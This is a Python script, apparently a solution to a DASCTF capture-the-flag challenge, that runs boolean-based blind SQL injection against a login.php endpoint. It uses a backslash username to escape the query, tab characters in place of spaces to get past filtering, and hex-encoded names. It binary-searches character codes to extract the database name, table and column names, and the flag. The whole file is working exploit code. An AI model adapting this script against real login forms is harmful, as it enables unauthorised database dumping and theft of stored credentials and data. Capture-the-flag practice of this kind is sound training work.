import requests
flag = ''
url = "http://80.endpoint-937257753a42410f8b8e78ee52ca818a.m.ins.cloud.dasctf.com:81/login.php"

def check_char(i, mid):
    data = {'username':"\\",'password':"||"}
    #payload = f"||case\x09ord(mid(database()\x09from\x09{i}\x09for\x091))\x09when\x09{mid}\x09then\x091\x09else\x090\x09end%23"
    
    # 数据库名
    #payload = f"||case\x09when\x09ord(mid(database()\x09from\x09{i}\x09for\x091))<{mid}\x09then\x091\x09else\x090\x09end#"

    # 表名
    #payload = f"||case\x09when\x09ord(mid((select\x09group_concat(table_name)\x09from\x09information_schema.tables\x09where\x09table_schema=0x646173637466)\x09from\x09{i}\x09for\x091))<{mid}\x09then\x091\x09else\x090\x09end#"
    
    # 列名
    payload = f"||case\x09when\x09ord(mid((select\x09group_concat(column_name)\x09from\x09information_schema.columns\x09where\x09table_name=0x7573657273)\x09from\x09{i}\x09for\x091))<{mid}\x09then\x091\x09else\x090\x09end#"    
    
    # 数据
    #payload = f"||case\x09when\x09ord(mid((select\x09group_concat(flag)\x09from\x09flagss)\x09from\x09{i}\x09for\x091))<{mid}\x09then\x091\x09else\x090\x09end#"
    data["password"] = payload
    #print(data)
    r = requests.post(url ,data=data)
    return "登录成功" not in r.text
    #return "Username or password error!" in r.text


def find_char(i):
    low, high = 32, 127  # 定义可打印字符的ASCII范围，从32到126
    while low < high:     # 进行二分查找，直到low不再小于high
        mid = (low + high) // 2  # 计算中间值
        if check_char(i, mid):  # 检查当前中间值对应的字符是否满足条件
            low = mid + 1  # 如果满足条件，说明目标字符可能在更高的范围，更新low
        else:
            high = mid  # 如果不满足条件，目标字符在当前mid以下，更新high
    return chr(low - 1)  # 返回找到的字符，low减去1是因为最后一轮循环结束时low已超出范围

def main():
    global flag
    for i in range(1, 40):  # 假设表名长度不超过40个字符
        char = find_char(i)
        #print(char)
        if char == chr(31):  # 如果返回的是控制字符，说明可能已经没有更多字符了
            break
        flag += char
        print(f"Current content: ~{flag}~")
main()